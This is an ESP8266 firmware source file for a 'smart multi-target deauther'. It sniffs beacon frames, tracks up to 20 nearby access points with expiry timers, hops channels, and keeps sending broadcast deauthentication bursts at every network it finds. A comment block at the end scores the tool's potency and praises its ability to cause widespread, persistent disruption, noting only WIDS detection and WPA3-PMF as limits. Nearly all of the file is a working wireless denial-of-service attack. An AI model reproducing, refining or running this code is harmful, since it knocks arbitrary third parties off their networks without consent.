// ESP8266 Smart Multi-Target Deauther with Dynamic Channel & AP Tracking
// Description:
// - Scans nearby APs using promiscuous sniffing
// - Maintains a dynamic list of nearby AP MAC addresses
// - Iterates through them, nests on each AP for repeated deauth attacks
// - Hops intelligently across active channels
// - Adds TTL for each AP to expire inactive ones
// - Optimized to be lightweight for ESP8266, no external libraries needed

// --- LIBRARIES ---
#include <ESP8266WiFi.h>      // Core library for ESP8266 Wi-Fi functions.
extern "C" {
  #include "user_interface.h" // Provides low-level SDK functions, including promiscuous mode and packet injection.
}

// === CONFIGURATION ===
#define MAX_APS 20            // The maximum number of Access Points the device will track and attack.
#define DEAUTH_BURSTS 5       // The number of deauth packets to send in each attack burst.
#define CHANNEL_HOP_INTERVAL 5000 // How often (in ms) to hop to a new channel for discovery.
#define AP_TTL 15000          // Time-To-Live (in ms). APs not seen for this duration will be removed from the list.

// === GLOBAL STRUCTS & VARIABLES ===
// This structure defines an object to hold information about a discovered Access Point.
struct APEntry {
  uint8_t mac[6];         // The 6-byte MAC address (BSSID) of the AP.
  uint8_t channel;        // The Wi-Fi channel the AP is operating on.
  unsigned long lastSeen; // Timestamp of when this AP was last detected.
};

APEntry aps[MAX_APS];     // An array to store the list of discovered APs.
uint8_t apCount = 0;        // A counter for the number of APs currently in the list.
uint8_t currentAP = 0;      // An index to cycle through the AP list for attacks.
unsigned long lastChannelHop = 0; // Timestamp for managing channel hopping.
uint8_t currentChannel = 1;   // The current channel the radio is tuned to for discovery.

// === DEAUTHENTICATION PACKET TEMPLATE ===
// This is the raw 802.11 deauthentication frame that will be transmitted.
uint8_t deauthPacket[26] = {
  /* Frame Control */
  0xC0, 0x00, 0x3A, 0x01, // Type/Subtype: Deauth, Duration
  /* Destination MAC */
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast address to deauth all clients.
  /* Source MAC (will be replaced) */
  0, 0, 0, 0, 0, 0,       // Placeholder for the AP's MAC address.
  /* BSSID (will be replaced) */
  0, 0, 0, 0, 0, 0,       // Placeholder for the AP's MAC address.
  /* Fragment & Sequence */
  0x00, 0x00,
  /* Reason Code */
  0x07, 0x00              // Reason 7: "Class 3 frame received from nonassociated STA".
};

// === AP LIST MANAGEMENT ===
// This function adds a new AP to the list or updates the `lastSeen` timestamp if it's already known.
void registerAP(uint8_t* bssid, uint8_t channel) {
  // First, check if we already have this AP in our list.
  for (uint8_t i = 0; i < apCount; i++) {
    if (memcmp(aps[i].mac, bssid, 6) == 0) {
      aps[i].lastSeen = millis(); // Update the timestamp.
      aps[i].channel = channel;   // Update the channel, in case it changed.
      return; // Exit the function.
    }
  }
  // If the AP is new and there is space in the list, add it.
  if (apCount < MAX_APS) {
    memcpy(aps[apCount].mac, bssid, 6);
    aps[apCount].channel = channel;
    aps[apCount].lastSeen = millis();
    apCount++;
  }
}

// === PROMISCUOUS CALLBACK FUNCTION ===
// This function is called for every Wi-Fi packet detected by the ESP8266.
void snifferCallback(uint8_t* buf, uint16_t len) {
  if (len < 36) return; // Ignore packets that are too short.

  // We are only interested in Beacon Frames (Type 0x80), as they announce the presence of an AP.
  uint8_t frameType = buf[0];
  if ((frameType & 0xF0) == 0x80) { // Check for beacon frame.
    uint8_t* bssid = &buf[10];   // The BSSID (MAC address) is at offset 10.
    uint8_t channel = buf[36]; // The channel is usually at offset 36.
    registerAP(bssid, channel);  // Add or update the AP in our list.
  }
}

// === UTILITY FUNCTION: PACKET MODIFICATION ===
// This function dynamically updates the deauth packet with the target AP's MAC address.
void setDeauthMACs(uint8_t* mac) {
  memcpy(&deauthPacket[10], mac, 6); // Set the Source MAC address.
  memcpy(&deauthPacket[16], mac, 6); // Set the BSSID.
}

// --- SETUP FUNCTION ---
// This function runs once on boot to initialize the device.
void setup() {
  Serial.begin(115200); // Start serial for debugging output.
  WiFi.mode(WIFI_STA);  // Set the Wi-Fi mode to Station.
  delay(100);

  // --- CONFIGURE PROMISCUOUS MODE ---
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(snifferCallback); // Register our sniffer function.
  wifi_promiscuous_enable(1);                  // Enable promiscuous (monitor) mode.

  Serial.println("[INFO] Smart Deauther Initialized. Scanning for APs...");
}

// --- MAIN LOOP ---
// This function runs continuously, executing the discovery and attack logic.
void loop() {
  unsigned long now = millis();

  // === DYNAMIC AP LIST CLEANUP ===
  // Periodically check the list of APs and remove any that haven't been seen recently.
  // This keeps the target list relevant and focused on active APs.
  for (uint8_t i = 0; i < apCount;) {
    if (now - aps[i].lastSeen > AP_TTL) {
      // If an AP has expired, remove it by shifting the rest of the list down.
      for (uint8_t j = i; j < apCount - 1; j++) aps[j] = aps[j + 1];
      apCount--;
    } else {
      i++;
    }
  }

  // === CHANNEL HOPPING FOR DISCOVERY ===
  // To find APs across the entire 2.4GHz spectrum, the device must periodically change channels.
  if (now - lastChannelHop > CHANNEL_HOP_INTERVAL) {
    currentChannel = (currentChannel % 13) + 1; // Cycle through channels 1-13.
    wifi_set_channel(currentChannel);
    lastChannelHop = now;
    Serial.printf("[HOP] Sniffer channel set to %d\n", currentChannel);
  }

  // === DEAUTHENTICATION ATTACK LOGIC ===
  if (apCount > 0) {
    if (currentAP >= apCount) currentAP = 0; // Loop back to the start of the list.

    // 1. Set the packet's source and BSSID to the target AP's MAC.
    setDeauthMACs(aps[currentAP].mac);
    // 2. Tune the radio to the specific channel of the target AP.
    wifi_set_channel(aps[currentAP].channel);

    Serial.printf("[DEAUTH] Attacking AP %02X:%02X:%02X:%02X:%02X:%02X on CH %d\n",
      aps[currentAP].mac[0], aps[currentAP].mac[1], aps[currentAP].mac[2],
      aps[currentAP].mac[3], aps[currentAP].mac[4], aps[currentAP].mac[5],
      aps[currentAP].channel);

    // 3. Send a burst of deauthentication packets.
    for (int i = 0; i < DEAUTH_BURSTS; i++) {
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
      delay(100);
    }
    // 4. Move to the next AP in the list for the next loop iteration.
    currentAP++;
  } else {
    // If no APs are found, just wait and continue scanning.
    delay(100);
  }
}

// --- CYBERSECURITY ANALYSIS ---
/*
 * This section provides a detailed analysis of the code from a cybersecurity perspective.
 * The scores are based on a comparison to other similar open-source projects and general
 * security principles. The scale is 1-10, where 1 is poor/simple and 10 is excellent/highly advanced.
 */

/*
 * 1. Implementation & Completeness: 8/10
 * 
 * Explanation: This script is a significant step up from the basic deauthers. It implements a fully
 * autonomous, multi-target attack system.
 * - Autonomous Discovery: It actively and continuously discovers its own targets by sniffing beacon frames.
 * - Dynamic Targeting: The AP list is not static. The `AP_TTL` feature allows the device to adapt to a
 *   changing environment, removing APs that are no longer in range and adding new ones.
 * - Intelligent Channel Hopping: It correctly implements two types of channel switching. First, it hops
 *   channels to discover new APs (`CHANNEL_HOP_INTERVAL`). Second, and more importantly, it switches to the
 *   *specific channel of the target AP* before launching the attack. This is a critical feature for effectiveness.
 */

/*
 * 2. Effectiveness & Potency: 8/10
 * 
 * Explanation: This is a highly effective and potent deauthentication tool for its class.
 * - Adaptive Attack: By continuously scanning and updating its target list, it can cause widespread and
 *   persistent disruption in a dense Wi-Fi environment. It will attack new networks as they appear and
 *   stop attacking those that disappear.
 * - Multi-Target Capability: Its ability to cycle through up to 20 targets makes it far more disruptive
 *   than a single-target script.
 * - Persistent Disruption: The continuous loop ensures that as soon as one attack cycle finishes, a new
 *   one begins, preventing clients from maintaining a stable connection to any nearby network.
 * Its only limitation is that it is a pure deauth (Layer 2) attack and can be defeated by WPA3-PMF.
 */

/*
 * 3. Stealth & Evasion: 2/10
 * 
 * Explanation: The tool is not designed for stealth. Its operation is aggressive and easily detectable.
 * - Deauth Flood Signature: The constant stream of deauthentication packets across multiple channels is a
 *   clear and unambiguous indicator of a DoS attack that any WIDS would flag immediately.
 * - Predictable Hopping: While it hops channels, the discovery hopping pattern is sequential (1-13), which
 *   could potentially be fingerprinted by a sophisticated monitoring system.
 */

/*
 * 4. Sophistication & Novelty: 7/10
 * 
 * Explanation: While the deauth attack itself is not novel, the implementation of a self-managing,
 * autonomous targeting system on a low-cost microcontroller is what gives this script its sophistication.
 * - State Management: The code demonstrates a good understanding of state management by tracking multiple
 *   targets, their channels, and their last-seen times. The AP list with a TTL is a feature often found
 *   in more professional-grade tools.
 * - Efficient Logic: The separation of discovery (via channel hopping) and attack (by switching to the
 *   target's specific channel) is a clever and efficient design that maximizes the effectiveness of the
 *   single radio.
 */
